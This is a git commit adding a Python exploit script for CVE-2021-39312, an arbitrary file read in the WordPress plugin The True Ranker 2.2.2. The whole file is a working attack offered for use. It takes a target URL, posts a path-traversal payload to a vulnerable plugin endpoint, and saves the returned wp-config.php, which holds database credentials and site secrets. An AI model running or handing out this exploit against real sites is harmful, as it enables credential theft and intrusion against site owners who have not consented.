e880b2052aa9a613936c3c820b493066d68f5620
0xZyd <98337319+0xZyd@users.noreply.github.com>
2022-01-24 21:50:19 +0530

    Create wp.py

---
+++ wp.py
@@ -0,0 +1,32 @@
+# Exploit Title: WordPress Plugin The True Ranker 2.2.2 - Arbitrary File Read
+# Vendor Homepage: https://wordpress.org/plugins/seo-local-rank/
+# Software Link: https://plugins.svn.wordpress.org/seo-local-rank/tags/2.2.2/
+# Version: versions <= 2.2.2
+# Tested on: Linux 
+# CVE: CVE-2021-39312
+
+#Exploit Usage: python exploit.py -u "http://your-wpsite.com"
+
+import argparse, textwrap
+import requests
+
+parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)                     
+group_must = parser
+group_must.add_argument("-u","--url",required=True) 
+parser.add_argument("--payload",default="../../../../../../../../../../wp-config.php",required=False) 
+
+args = parser.parse_args()
+HOST = args.url
+PAYLOAD = args.payload
+
+url = "{}/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php".format(HOST)
+payload = "/scripts/simple.php/{}".format(PAYLOAD)
+
+
+r = requests.post(url,data={'src': payload})
+if r.status_code == 200:
+
+	f = open("wp-config.php", "w")
+	f.write(str(r.text))
+else:
+  print("No exploit found")
